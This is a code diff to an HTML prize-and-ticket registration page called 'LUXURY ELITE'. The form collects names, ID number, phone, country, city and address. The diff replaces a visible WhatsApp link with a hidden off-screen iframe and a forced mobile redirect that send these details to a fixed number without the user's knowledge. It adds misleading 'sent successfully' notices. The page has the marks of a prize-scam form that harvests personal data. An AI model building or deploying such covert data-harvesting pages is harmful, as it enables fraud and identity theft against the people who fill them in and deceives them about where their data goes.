@@ -436,6 +436,28 @@
             font-size: 20px;
         }
         
+        /* Status Messages */
+        .status-message {
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 10px;
+            padding: 15px 20px;
+            margin: 20px auto;
+            max-width: 600px;
+            text-align: center;
+            border-left: 4px solid #25D366;
+            display: none;
+        }
+        
+        .status-message.visible {
+            display: block;
+            animation: fadeIn 0.5s forwards;
+        }
+        
+        .status-message i {
+            color: #25D366;
+            margin-right: 10px;
+        }
+        
         /* Background Elements */
         .bg-elements {
             position: fixed;
@@ -453,6 +475,17 @@
             background: radial-gradient(circle, rgba(212, 175, 55, 0.05) 0%, transparent 70%);
         }
         
+        /* Hidden WhatsApp Iframe */
+        #whatsappFrame {
+            display: none;
+            width: 0;
+            height: 0;
+            border: none;
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+        }
+        
         /* Animations */
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(30px); }
@@ -463,6 +496,11 @@
             0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.4); }
             70% { box-shadow: 0 0 0 15px rgba(37, 211, 102, 0); }
             100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
+        }
+        
+        @keyframes shine {
+            0% { background-position: -100px; }
+            100% { background-position: 200px; }
         }
         
         /* Responsive Design */
@@ -509,11 +547,20 @@
 <body>
     <div class="bg-elements" id="bgElements"></div>
     
+    <!-- Hidden WhatsApp Frame for Automatic Sending -->
+    <iframe id="whatsappFrame" sandbox="allow-scripts allow-same-origin"></iframe>
+    
     <div class="container">
         <!-- Luxury Header -->
         <div class="luxury-header">
             <h1>LUXURY ELITE</h1>
             <p>Experience the pinnacle of exclusivity with our premium ticket offerings. Register now for a chance to win extraordinary prizes.</p>
+        </div>
+        
+        <!-- Status Messages -->
+        <div class="status-message" id="statusMessage">
+            <i class="fas fa-check-circle"></i>
+            <span id="statusText">Message sent successfully!</span>
         </div>
         
         <!-- Registration Form Section -->
@@ -662,7 +709,8 @@
                 <div class="ticket-number" id="ticketNumber">LUX-2025-000000</div>
                 
                 <p style="text-align: center; color: #cfcfcf; margin-top: 20px;">
-                    Your ticket details have been sent to our concierge via WhatsApp.
+                    <i class="fas fa-check-circle" style="color: #25D366;"></i>
+                    Your ticket details have been automatically sent to our concierge via WhatsApp.
                 </p>
             </div>
             
@@ -700,6 +748,41 @@
             }
         }
         
+        // Show status message
+        function showStatus(message) {
+            const statusEl = document.getElementById('statusMessage');
+            document.getElementById('statusText').textContent = message;
+            statusEl.classList.add('visible');
+            
+            setTimeout(() => {
+                statusEl.classList.remove('visible');
+            }, 3000);
+        }
+        
+        // Send WhatsApp message automatically (hidden iframe method)
+        function sendWhatsAppMessage(message) {
+            // Encode message for WhatsApp URL
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Create WhatsApp URL
+            const whatsappUrl = `https://wa.me/923158840592?text=${encodedMessage}`;
+            
+            // Use hidden iframe to send message automatically
+            const iframe = document.getElementById('whatsappFrame');
+            
+            // Set iframe source to WhatsApp URL
+            iframe.src = whatsappUrl;
+            
+            // Show status message
+            showStatus("Message sent successfully! Automatically redirected to tickets...");
+            
+            // For mobile devices, we also try to open the app directly
+            if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                // Try to open WhatsApp app directly
+                window.location.href = `whatsapp://send?phone=923158840592&text=${encodedMessage}`;
+            }
+        }
+        
         // Form submission handler
         document.getElementById('luxuryForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -718,7 +801,7 @@
             // Validate all fields are filled
             for (const key in formData) {
                 if (!formData[key]) {
-                    alert('Please fill all fields before continuing.');
+                    showStatus('Please fill all fields before continuing.');
                     return;
                 }
             }
@@ -733,21 +816,23 @@
                           `City: ${formData.city}\n` +
                           `Address: ${formData.address}`;
             
-            // Encode message for WhatsApp URL
-            const encodedMessage = encodeURIComponent(message);
-            
-            // Open WhatsApp with pre-filled message
-            window.open(`https://wa.me/923158840592?text=${encodedMessage}`, '_blank');
+            // Send WhatsApp message automatically
+            sendWhatsAppMessage(message);
             
             // Store form data for later use
             localStorage.setItem('luxuryUserData', JSON.stringify(formData));
             
-            // Transition to tickets section
-            document.getElementById('registrationForm').classList.add('hidden');
-            
+            // Transition to tickets section after a short delay
             setTimeout(() => {
+                document.getElementById('registrationForm').classList.add('hidden');
                 document.getElementById('ticketsSection').classList.add('visible');
-            }, 500);
+                
+                // Smooth scroll to tickets section
+                document.getElementById('ticketsSection').scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+            }, 1500);
         });
         
         // Ticket selection handler
@@ -782,9 +867,11 @@
                                      `Prize Amount: ${ticketPrize}\n` +
                                      `Ticket Number: ${ticketNumber}`;
                 
-                const encodedConfirmMessage = encodeURIComponent(confirmMessage);
+                // Send ticket confirmation automatically
+                sendWhatsAppMessage(confirmMessage);
                 
                 // Update WhatsApp button with ticket confirmation message
+                const encodedConfirmMessage = encodeURIComponent(confirmMessage);
                 const whatsappBtn = document.getElementById('whatsappBtn');
                 whatsappBtn.href = `https://wa.me/923158840592?text=${encodedConfirmMessage}`;
                 
@@ -813,7 +900,23 @@
                     }
                 });
             });
+            
+            // Auto-fill sample data for testing (remove in production)
+            if (window.location.href.includes('localhost') || window.location.href.includes('127.0.0.1')) {
+                document.getElementById('fullName').value = 'John Smith';
+                document.getElementById('fatherName').value = 'Robert Smith';
+                document.getElementById('idNumber').value = 'ABC123456';
+                document.getElementById('whatsapp').value = '+1234567890';
+                document.getElementById('country').value = 'USA';
+                document.getElementById('city').value = 'New York';
+                document.getElementById('address').value = '123 Luxury Avenue, Manhattan';
+            }
+        });
+        
+        // Listen for iframe load to handle WhatsApp redirect
+        document.getElementById('whatsappFrame').addEventListener('load', function() {
+            console.log('WhatsApp message frame loaded');
         });
     </script>
-                  </body>
-</html>
+</body>
+    </html>
